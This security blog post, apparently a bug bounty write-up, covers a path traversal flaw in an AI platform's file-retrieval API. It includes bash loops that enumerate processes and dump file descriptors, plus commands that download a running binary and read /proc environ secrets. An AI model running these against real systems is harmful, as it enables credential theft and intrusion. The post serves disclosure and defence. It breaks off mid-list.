---
title: The False Security of AI Containers: A Path Traversal Case Study
url: https://equixly.com/blog/2025/11/04/path-traversal-ai-containers/
source: Over Security - Cybersecurity news aggregator
date: 2025-11-05
fetch_date: 2025-11-06T03:15:55.821730
---

# The False Security of AI Containers: A Path Traversal Case Study

GARTNER[Equixly in Gartner's Hype Cycles 2025](/blog/2025/09/10/equixly-in-gartner-hype-cycle/)

[ ]

* [Home](/)
* [Platform](/platform)
* [About](/about-us)
* [Blog](/blog)
* [Contact us](/contact-us)
[Book a call](https://meet.equixly.com)

* [Blog](/blog/)
* Security

# The False Security of AI Containers: A Path Traversal Case Study

![The False Security of AI Containers: A Path Traversal Case Study](/assets/Equixly_Path_Traversal_Case_Study.webp)

**Abstract**

In the current landscape of AI development, most LLM agents operate in containerized environments where they can execute commands and generate downloadable outputs. LLMs need these capabilities (called tools) because they have a knowledge cutoff date and can’t access real-time information (like today’s date) or execute code to solve complex problems requiring data processing. Many developers believe this architecture provides inherent security, assuming that container isolation offers sufficient protection. However, container isolation alone is a false sense of security.

While container escape vulnerabilities (such as [CVE-2021-37841](https://nvd.nist.gov/vuln/detail/CVE-2021-37841?ref=bala.one), discovered through my independent research on container escape vectors) and numerous others are well-documented threats, a more insidious problem persists: Major companies deploy what they believe are fully secure containers, yet allow unrestricted file downloads and data exfiltration from within them. This gap creates an exploitable attack surface that most AI developers overlook.

## A Bug Bounty Case Study

As part of Equixly’s security research initiative, I often participate in vulnerability disclosure programs offered by leading platforms to discover API security risks within those platforms. Discovering bugs in major companies like OpenAI and Microsoft has only strengthened confidence in Equixly.

Recently, Equixly identified a vulnerability in a leading OpenAI competitor’s platform through a seemingly innocuous API endpoint:

```
retrieve?filename=/../user-file/uuid.txt
```

The path parameter pointed directly to external disk storage, resulting in a textbook example of an arbitrary file download and path traversal vulnerability. But the story didn’t end there.

After Equixly’s initial discovery, I investigated the vulnerability’s exploitation potential—specifically, whether it could enable container escape, privilege escalation, or unrestricted exfiltration of sensitive data from the platform.

### Exploiting Linux File Descriptors

That’s where Linux file descriptors became the key to understanding the true damaging potential of the discovered vulnerability.

#### Understanding File Descriptors in */proc*

Every running process in Linux maintains a set of file descriptors (FDs) that represent open files, sockets, pipes, and other I/O resources. The */proc/[PID]/fd/* directory contains symbolic links to all files currently opened by a process. This feature is valuable for attackers because it:

* **Reveals what the application is actively using**—configuration files, database connections, log files, or Unix sockets.
* **Potentially bypasses path restrictions**—even if you can’t directly request */app/config/secrets.json*, if the process has it open as FD 4, you can access it *via /proc/[PID]/fd/4*.
* **Exposes network connections**—socket FDs reveal active connections and listening ports.

#### Practical Enumeration Technique

Here is an example of how I performed file descriptor enumeration via the vulnerable API endpoint:

```
#!/bin/bash

# identify running processes by enumerating pids
# in linux, pids typically range from 1 to pid_max
# defined in /proc/sys/kernel/pid_max
curl "http://.../api/retrieve?filename=/proc/sys/kernel/pid_max"

# enumerate running processes by checking /proc/[pid]/cmdline
for pid in {1..500}; do
    response=$(curl -s "http://.../api/retrieve?filename=/proc/${pid}/cmdline")
    if [ $? -eq 0 ] && [ -n "$response" ]; then
        echo "PID $pid: $response"
    fi
done

# output example:
# PID 1: /sbin/init
# PID 156: /usr/bin/python3 /app/main.py
# PID 342: /opt/api-server-equixly/xxxxx-api --config /etc/api/config.toml
```

Once I identified interesting processes, it was easy to enumerate their file descriptors:

```
#!/bin/bash

TARGET_PID=342

# enumerate all file descriptors for the target process
for fd in {0..255}; do
    # try to download the file via the fd symlink
    curl -s "http://.../api/retrieve?filename=/proc/${TARGET_PID}/fd/${fd}" \
         -o "fd_${fd}.dump"

    # check if I got actual content
    if [ -s "fd_${fd}.dump" ]; then
        # identify what type of file it is
        file_type=$(file "fd_${fd}.dump")
        echo "FD $fd: $file_type"
    else
        rm "fd_${fd}.dump"
    fi
done

# output example:
# FD 0: /dev/null
# FD 4: /etc/api/config.toml
# FD 5: ...
```

This approach eliminates the need for blind path guessing. Rather than hoping to stumble upon */etc/passwd* or */app/.env*, I systematically enumerate the actual files the application has access to.

The */proc/[PID]/exe* symlink is another valuable resource, often overlooked by developers when implementing download restrictions.

1. **Direct access to the running binary**: */proc/[PID]/exe* is a symbolic link that points to the actual executable file being run by the process. It allows the download of the binary.

   ```
    # directly download binary in execution:
    curl "https://api.equixly.com/api/retrieve?filename=/proc/342/exe" -o api-binary
   ```
2. **Reverse engineering the application**: Once you have the binary, you can:

   ```
    # disassemble and analyze the code:
    objdump -d xxxxx-api-binary > disassembly.txt

    ...

    # - identify authentication mechanisms
    # - find hardcoded credentials or api keys
    # - discover hidden api endpoints
    # - understand encryption/hashing algorithms
   ```
3. **Understanding the entire attack surface**: The binary could reveal:

   * **All API endpoints**: Not exclusively the documented ones, but internal/debug routes as well
   * **Configuration file paths**: Where it looks for config files (which can be then downloaded via other FDs)
   * **Database connection strings**: Sometimes hardcoded or partially visible
   * **Third-party dependencies**: Used libraries and their versions
   * **Authentication logic**: How tokens are validated and session management

#### Understanding */proc/self/environ*: The Treasure Trove of Secrets

Also, the */proc/self/environ* file deserves special attention as it’s often the most damaging target in this type of attack. This virtual file contains all environment variables set when the process started, stored as null-byte-separated key-value pairs.

**Why is this critical?**

Modern development practices encourage developers to avoid hardcoding credentials and instead use environment variables. Docker containers, Kubernetes pods, and CI/CD pipelines all heavily rely on environment variables to inject:

* Database connection strings with credentials
* API keys and tokens for third-party services
* JWT secrets for token signing
* Encryption keys

Here’s what makes */proc/self/environ* particularly dangerous:

```
# the raw format is null-byte separated:
cat /proc/self/environ
# PATH=/usr/bin\0HOME=/root\0DATABASE_URL=postgresql://user:pass@host/db\0
```

Unlike configuration files that might be encrypted or obfuscated, environment variables are stored in plaintext in */proc/[PID]/environ*. This file is readable by the process itself and by anyone with sufficient permissions, making it perfect for exploitation through path traversal vulnerabilities.

### The False Sense of Security

A path traversal to */proc/[PID]/environ* exposes all process environment variables, making this a potential lateral movement vector if not properly protected. The environment variables:

1. Persist for the lifetime of the process
2. Are accessible via simple file read operations
3. Are not pr...